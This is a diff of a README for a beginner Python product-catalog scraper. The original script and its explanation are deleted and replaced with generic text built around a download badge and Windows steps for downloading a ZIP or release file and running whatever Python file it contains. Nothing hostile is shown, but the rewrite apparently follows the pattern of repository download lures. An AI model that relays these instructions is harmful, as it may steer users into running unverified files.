@@ -1,340 +1,195 @@
+# 📘 basic-parser-example - Simple product parsing made easy
 
-![199e2dd49ac153f1a1620afaee261e0c](https://github.com/user-attachments/assets/2f4183ee-b0a3-4877-bcf4-83e7a1984691)
+[![Download](https://img.shields.io/badge/Download-Basic%20Parser%20Example-blue?style=for-the-badge)](https://github.com/kgxhama/basic-parser-example)
 
+## 🖥️ What this app does
 
-# Simple Product Catalog Parser in Python
+Simple Product Parser is a small Python app for learning how web scraping works. It opens catalog pages, reads product details, and prints the results on screen.
 
-## Description
+It can help you understand how to:
 
-This project demonstrates a very basic web parser written in Python.  
-It is intentionally simple and designed strictly for educational purposes.
+- load web pages
+- find product data on a page
+- read text from page elements
+- print clean output for each product
 
-The script shows how to:
+This project is meant for beginners who want a simple example they can run on Windows.
 
-- Send HTTP requests to a website
-- Parse HTML content
-- Extract structured data from web pages
-- Handle missing values
-- Iterate through multiple pages
+## 📥 Download and run on Windows
 
-This parser is not intended for production use.  
-It does not include advanced features such as retries, proxies, rate limiting, or data storage.  
-It is provided only as an example for beginners who want to understand the basic logic of web scraping.
+Visit this page to download and run the app:
 
----
+https://github.com/kgxhama/basic-parser-example
 
-# Purpose
+If the page contains a source code ZIP or a release file, download it to your computer first.
 
-The script loads several catalog pages from a website and extracts product information.
+### Steps for Windows
 
-It collects:
+1. Open the link above in your browser.
+2. Click the green Code button or the release file, if one is provided.
+3. Download the ZIP file to your Downloads folder.
+4. Right-click the ZIP file and choose Extract All.
+5. Open the extracted folder.
+6. Look for a file named `main.py`, `app.py`, or a similar Python file.
+7. If Python is installed, double-click the file or run it from Command Prompt.
+8. Read the text output in the window.
 
-- Sequential item number
-- Product title
-- Article number
-- Brand
-- Producer
-- Size
-- Old price
-- New price
+If Windows asks what app should open the file, choose Python.
 
-The data is printed to the console.
+## 🔧 What you need
 
----
-
-# Technologies Used
+This project is built with:
 
 - Python 3
 - requests
-- BeautifulSoup (bs4)
+- BeautifulSoup
 - lxml
 
----
+For normal use on Windows, you need:
 
-# Installation
+- Windows 10 or Windows 11
+- Python 3 installed
+- internet access
+- a web browser
+- the files from this repository
 
-Install dependencies before running the script:
+## 🧩 What you will see
 
-```bash
-pip install requests beautifulsoup4 lxml
-````
+When the app runs, it reads multiple catalog pages and prints product data. The output may include:
 
----
+- product title
+- article number
+- brand
+- producer
+- size
+- old price
+- new price
 
-# Full Script
+The data appears in the console window or terminal. This lets you see how a parser collects page content and turns it into readable text.
 
-```python
-import requests
-from bs4 import BeautifulSoup
+## ⚙️ How it works
 
-# List of catalog pages
-links = [
-    "https://opt-opt-opt.ru/?page_size=300",
-    "https://opt-opt-opt.ru/?page_size=280&PAGEN_1=2",
-    "https://opt-opt-opt.ru/?page_size=280&PAGEN_1=3",
-    "https://opt-opt-opt.ru/?page_size=280&PAGEN_1=4",
-    "https://opt-opt-opt.ru/?page_size=280&PAGEN_1=5",
-    "https://opt-opt-opt.ru/?page_size=280&PAGEN_1=6"
-]
+The script follows a simple flow:
 
-# Helper function to safely extract text
-get = lambda x: x.text.strip() if x else "N/A"
+1. It opens a catalog page.
+2. It reads the HTML from the page.
+3. It searches for product blocks.
+4. It extracts text from key fields.
+5. It prints the result for each product.
 
-# Counter for numbering items
-item_number = 0
+The app uses `requests` to get page data and `BeautifulSoup` with `lxml` to read the page structure.
 
-# Loop through all pages
-for soup in map(lambda l: BeautifulSoup(requests.get(l).text, 'lxml'), links):
+## 📁 Files in the project
 
-    # Find all product blocks
-    for item in soup.select('.bx_catalog_item.double'):
+You can expect files like these:
 
-        # Extract main elements
-        a = item.select_one('.bx_catalog_item_images')
-        info = item.select_one('.bx_catalog_item_articul')
+- Python script files
+- a `README.md` file
+- package files
+- project folders for source code
+- dependency lists such as `requirements.txt`
 
-        # Extract product attributes
-        vals = [(s.next_sibling or '').strip()
-                for s in info.select('strong')] if info else []
+If you see a requirements file, install the listed packages before you run the script.
 
-        # Ensure list has exactly 4 values
-        vals += ["N/A"] * (4 - len(vals))
+## 🧪 Install the Python packages
 
-        # Increment item counter
-        item_number += 1
+If you want to run the script from source, install the needed packages first.
 
-        # Print product data
-        if a:
-            print(
-                "Item Number:", item_number,
-                "Title:", a.get('title', ''),
-                "Articul:", vals[0],
-                "Mark:", vals[1],
-                "Producer:", vals[2],
-                "Size:", vals[3],
-                "Old Price:", get(item.select_one('.bx_catalog_item_old_price')),
-                "New Price:", get(item.select_one('.bx_price'))
-            )
-```
+Open Command Prompt in the project folder and run:
 
----
+`pip install requests beautifulsoup4 lxml`
 
-# Step-by-Step Explanation
+If the project includes a `requirements.txt` file, you can also use:
 
-## Step 1 — Importing Libraries
+`pip install -r requirements.txt`
 
-The script imports two libraries:
+## ▶️ Run the script
 
-* requests — sends HTTP requests to websites
-* BeautifulSoup — parses HTML content
+After you install Python and the packages, run the main file from the project folder.
 
-```
-import requests
-from bs4 import BeautifulSoup
-```
+Example:
 
----
+`python main.py`
 
-## Step 2 — List of URLs
+If the file has a different name, use that name instead.
 
-This list contains all catalog pages that the parser will process.
+If the app opens a console window and closes fast, run it from Command Prompt so you can read the output.
 
-```
-links = [
-    "page1",
-    "page2"
-]
-```
+## 🧭 Basic use
 
-The script loops through each page one by one.
+This app does not need a lot of setup.
 
----
+1. Open the project folder.
+2. Run the Python script.
+3. Wait while it reads the product pages.
+4. Check the printed list of products.
 
-## Step 3 — Helper Function
+The script is made for learning, so the output is plain and easy to follow.
 
-The helper function safely extracts text from HTML elements.
+## 🛠️ Common issues on Windows
 
-```
-get = lambda x: x.text.strip() if x else "N/A"
-```
+### Python is not found
 
-If the element exists:
+If Windows says Python is not found:
 
-```
-1200
-```
+- install Python 3 from the Python website
+- check the box that adds Python to PATH during setup
+- close and reopen Command Prompt
+- run the script again
 
-If the element does not exist:
+### Missing package error
 
-```
-N/A
-```
+If you see an error about `requests`, `bs4`, or `lxml`:
 
-This prevents errors.
+- open Command Prompt in the project folder
+- run `pip install requests beautifulsoup4 lxml`
+- try again
 
----
+### Script does not show output
 
-## Step 4 — Item Counter
+If the window opens and nothing appears:
 
-The counter assigns a sequential number to each product.
+- wait a few seconds
+- check that your internet connection works
+- make sure the target page still loads in your browser
+- run the script from Command Prompt
 
-```
-item_number = 0
-```
+## 📚 Good fit for learning
 
-Every time a new product is found:
+This project is useful if you want to learn:
 
-```
-item_number += 1
-```
+- how Python reads web pages
+- how HTML parsing works
+- how to extract product data
+- how to print structured results
+- how to use common scraping tools
 
----
+It is a basic example, so it keeps the code simple and focused.
 
-## Step 5 — Page Loading
+## 🔍 Search terms
 
-The script loads each page using an HTTP request.
+This repository is related to:
 
-```
-requests.get(url)
-```
+- beautifulsoup
+- beautifulsoup4
+- education
+- educational project
+- parser
+- parsing
+- python
+- python script
+- python3
+- scraper python
 
-Then it parses the HTML:
+## 📝 Project purpose
 
-```
-BeautifulSoup(html, 'lxml')
-```
+Simple Product Parser is provided for educational use. It shows how a small Python script can read catalog pages and pull out product details in a way that beginners can follow.
 
----
+## 🗂️ Quick start checklist
 
-## Step 6 — Finding Products
-
-The script searches for product blocks using a CSS selector.
-
-```
-.bx_catalog_item.double
-```
-
-Example HTML:
-
-```
-<div class="bx_catalog_item double">
-```
-
-Each block represents one product.
-
----
-
-## Step 7 — Extracting Elements
-
-The script extracts:
-
-* product title block
-* product information block
-
-```
-a = item.select_one('.bx_catalog_item_images')
-info = item.select_one('.bx_catalog_item_articul')
-```
-
----
-
-## Step 8 — Extracting Product Data
-
-The script finds all strong tags and reads the text next to them.
-
-Example HTML:
-
-```
-<strong>Article:</strong> 12345
-<strong>Brand:</strong> BrandName
-```
-
-Result:
-
-```
-12345
-BrandName
-```
-
----
-
-## Step 9 — Handling Missing Data
-
-If fewer than 4 values are found, the script fills missing values.
-
-```
-vals += ["N/A"] * (4 - len(vals))
-```
-
-This prevents index errors.
-
----
-
-## Step 10 — Incrementing the Counter
-
-Each product increases the counter:
-
-```
-item_number += 1
-```
-
----
-
-## Step 11 — Output
-
-The script prints the collected data.
-
-Example output:
-
-```
-Item Number: 1
-Title: Product Name
-Articul: 12345
-Mark: Brand
-Producer: Company
-Size: L
-Old Price: 1500
-New Price: 1200
-```
-
----
-
-# Limitations
-
-This parser:
-
-* does not use proxies
-* does not use delays
-* does not handle network errors
-* does not store data in files
-* does not support high-load scraping
-* does not bypass website protections
-
-It is intentionally simple.
-
-# Intended Audience
-
-This project is intended for:
-
-* beginners learning Python
-* students studying web scraping
-* developers learning HTML parsing
-* people who want to understand parser logic
-
-# Possible Improvements
-
-Future versions may include:
-
-* saving data to CSV
-* saving data to JSON
-* error handling
-* logging
-* retry logic
-* request delays
-* proxy support
-* automatic pagination
-* multithreading
-
-# License
-
-This project is provided for educational purposes only.
+- download the project from the link above
+- extract the files
+- install Python 3
+- install `requests`, `beautifulsoup4`, and `lxml`
+- run the main Python file
+- read the product data in the terminal
